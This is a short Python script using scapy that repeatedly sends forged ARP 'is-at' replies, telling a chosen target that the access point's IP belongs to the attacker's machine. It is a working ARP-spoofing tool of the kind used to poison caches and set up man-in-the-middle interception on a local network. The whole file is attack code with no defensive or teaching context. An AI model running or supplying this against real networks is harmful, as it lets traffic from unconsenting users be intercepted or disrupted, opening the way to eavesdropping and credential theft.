#!/usr/bin/python

import sys
import time
from scapy.all import sendp, ARP, Ether

if sys.argv[1] != "0":
    iface = sys.argv[1]
else :
    iface = raw_input("interface: ")

if sys.argv[2] != "0":
    target_ip = sys.argv[2]
else:
    target_ip = raw_input("ip target: ")
   
if sys.argv[3] != "0":
    fake_ip = sys.argv[3]
else :
    fake_ip = raw_input("ip Ap: ")


ethernet = Ether()
arp = ARP(pdst=target_ip,
psrc=fake_ip,
op="is-at")
packet = ethernet / arp

while True:
 sendp(packet, iface=iface)
 time.sleep(0.01)
 
